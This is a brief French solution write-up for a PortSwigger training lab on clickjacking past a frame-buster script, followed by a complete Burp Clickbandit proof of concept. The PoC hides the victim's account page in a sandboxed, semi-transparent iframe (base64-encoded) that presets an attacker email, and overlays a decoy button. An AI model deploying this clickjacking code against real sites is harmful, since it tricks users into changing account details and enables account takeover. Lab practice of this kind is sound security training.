# Lab

https://portswigger.net/web-security/clickjacking/lab-frame-buster-script

## Solution

Comme dans l'autre lab, on peut injecter l'email via le query param éponyme.

Mais cette fois-ci, le site est protégé par un script qui empêche le chargement dans un iframe.

Cela peut être contourné en utilisant un iframe avec les 

```html
<div id="container" style="clip-path:none;clip:auto;overflow:visible;position:absolute;left:0;top:0;width:100%;height:100%">
<!-- Clickjacking PoC Generated by Burp Suite Professional -->
<input id="clickjack_focus" style="opacity:0;position:absolute;left:-5000px;">
<div id="clickjack_button" style="opacity: 0; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 1px; height: 1px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;"><div style="position:relative;top: 50%;transform: translateY(-50%);">Click</div></div>
<!-- Show this element when clickjacking is complete -->
<div id="clickjack_complete" style="display: none; transform-style: preserve-3d; font-family: Arial; font-size: 16pt; color: red; text-align: center; width: 100%; height: 100%;"><div style="position:relative;top: 50%;transform: translateY(-50%);">You've been clickjacked!</div></div>
<iframe id="parentFrame" src="data:text/html;base64,PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIGZ1bmN0aW9uKGUpeyB2YXIgZGF0YSwgY2hpbGRGcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjaGlsZEZyYW1lIik7IHRyeSB7IGRhdGEgPSBKU09OLnBhcnNlKGUuZGF0YSk7IH0gY2F0Y2goZSl7IGRhdGEgPSB7fTsgfSBpZighZGF0YS5jbGlja2JhbmRpdCl7IHJldHVybiBmYWxzZTsgfSBjaGlsZEZyYW1lLnN0eWxlLndpZHRoID0gZGF0YS5kb2NXaWR0aCsicHgiO2NoaWxkRnJhbWUuc3R5bGUuaGVpZ2h0ID0gZGF0YS5kb2NIZWlnaHQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLmxlZnQgPSBkYXRhLmxlZnQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLnRvcCA9IGRhdGEudG9wKyJweCI7fSwgZmFsc2UpOzwvc2NyaXB0PjxpZnJhbWUgc3JjPSJodHRwczovLzBhMDYwMGM4MDQ1OWQ2ZTA4MWU1M2U4ODAwY2IwMDE4LndlYi1zZWN1cml0eS1hY2FkZW15Lm5ldC9teS1hY2NvdW50P2VtYWlsPWV2aWwmIzY0O2RvbWFpbi5jb20iIHNjcm9sbGluZz0ibm8iIHN0eWxlPSJ3aWR0aDoxOTAzcHg7aGVpZ2h0OjYzMHB4O3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6LTI2M3B4O3RvcDotMjg4cHg7Ym9yZGVyOjA7IiBmcmFtZWJvcmRlcj0iMCIgc2FuZGJveD0iYWxsb3ctc2FtZS1vcmlnaW4JYWxsb3ctZm9ybXMiIGlkPSJjaGlsZEZyYW1lIiBvbmxvYWQ9InBhcmVudC5wb3N0TWVzc2FnZShKU09OLnN0cmluZ2lmeSh7Y2xpY2tiYW5kaXQ6MX0pLCcqJykiPjwvaWZyYW1lPg==" frameborder="0" scrolling="no" style="-ms-transform: scale(1.0);-ms-transform-origin: 200px 200px;transform: scale(1.0);-moz-transform: scale(1.0);-moz-transform-origin: 200px 200px;-o-transform: scale(1.0);-o-transform-origin: 200px 200px;-webkit-transform: scale(1.0);-webkit-transform-origin: 200px 200px;opacity:0.5;border:0;position:absolute;z-index:1;width:1903px;height:630px;left:0px;top:0px"></iframe>
<svg id="circle" style="position:absolute;z-index:0;left:100px;top:150px;"><circle cx="100" cy="50" r="40" stroke="red" fill="none" stroke-width="1"></circle></svg></div>
<script>function findPos(obj) {
	    var left = 0, top = 0;
	    if(obj.offsetParent) {
	        while(1) {
	          left += obj.offsetLeft;
	          top += obj.offsetTop;
	          if(!obj.offsetParent) {
	            break;
	          }
	          obj = obj.offsetParent;
	        }
	    } else if(obj.x && obj.y) {
	        left += obj.x;
	        top += obj.y;
	    }
	    return [left,top];
  	}function generateClickArea(pos) {
			var elementWidth, elementHeight, x, y, parentFrame = document.getElementById('parentFrame'), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight,
				btn = document.getElementById('clickjack_button');
			if(pos < window.clickbandit.config.clickTracking.length) {
				clickjackCompleted(false);
				elementWidth = window.clickbandit.config.clickTracking[pos].width;
				elementHeight = window.clickbandit.config.clickTracking[pos].height;
				btn.style.width = elementWidth + 'px';
				btn.style.height = elementHeight + 'px';
				window.clickbandit.elementWidth = elementWidth;
				window.clickbandit.elementHeight = elementHeight;
				x = window.clickbandit.config.clickTracking[pos].left;
				y = window.clickbandit.config.clickTracking[pos].top;
				docWidth = window.clickbandit.config.clickTracking[pos].documentWidth;
				docHeight = window.clickbandit.config.clickTracking[pos].documentHeight;
				parentOffsetWidth = desiredX - x;
				parentOffsetHeight = desiredY - y;
				parentFrame.style.width = docWidth+'px';
				parentFrame.style.height = docHeight+'px';
				parentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),'*');
				calculateButtonSize(getFactor(parentFrame));
				showButton();
				if(parentFrame.style.opacity === '0') {
					calculateClip();
				}
			} else {
				resetClip();
				hideButton();
				clickjackCompleted(true);
			}
		}function hideButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 0;
		}function showButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 1;
		}function clickjackCompleted(show) {
			var complete = document.getElementById('clickjack_complete');
			if(show) {
				complete.style.display = 'block';
			} else {
				complete.style.display = 'none';
			}
		}window.addEventListener("message", function handleMessages(e){
			var data;
			try {
				data = JSON.parse(e.data);
			} catch(e){
				data = {};
			}
			if(!data.clickbandit) {
				return false;
			}
			showButton();
		},false);window.addEventListener("blur", function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById("clickjack_focus").focus();},1000); } }, false);document.getElementById("parentFrame").addEventListener("mouseover",function(){ window.clickbandit.mouseover = true; }, false);document.getElementById("parentFrame").addEventListener("mouseout",function(){ window.clickbandit.mouseover = false; }, false);</script><script>window.clickbandit={mode: "review", mouseover:false,elementWidth:1,elementHeight:1,config:{"x":463,"y":488,"clickTracking":[]}};function calculateClip() {
			var btn = document.getElementById('clickjack_button'), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById('container'), x = btn.offsetLeft, y = btn.offsetTop;
			container.style.overflow = 'hidden';
			container.style.clip = 'rect('+y+'px, '+(x+w)+'px, '+(y+h)+'px, '+x+'px)';
			container.style.clipPath = 'inset('+y+'px '+(x+w)+'px '+(y+h)+'px '+x+'px)';
		}function calculateButtonSize(factor) {
			var btn = document.getElementById('clickjack_button'), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);
			btn.style.width = resizedWidth + 'px';
			btn.style.height = resizedHeight + 'px';
			if(factor > 100) {
				btn.style.fontSize = '400%';
			} else {
				btn.style.fontSize = (factor * 100) + '%';
			}
		}function resetClip() {
			var container = document.getElementById('container');
			container.style.overflow = 'visible';
			container.style.clip = 'auto';
			container.style.clipPath = 'none';
		}function getFactor(obj) {
			if(typeof obj.style.transform === 'string') {
				return obj.style.transform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.msTransform === 'string') {
				return obj.style.msTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.MozTransform === 'string') {
				return obj.style.MozTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.oTransform === 'string') {
				return obj.style.oTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.webkitTransform === 'string') {
				return obj.style.webkitTransform.replace(/[^\d.]/g,'');
			}
			return 1;
		}</script>
```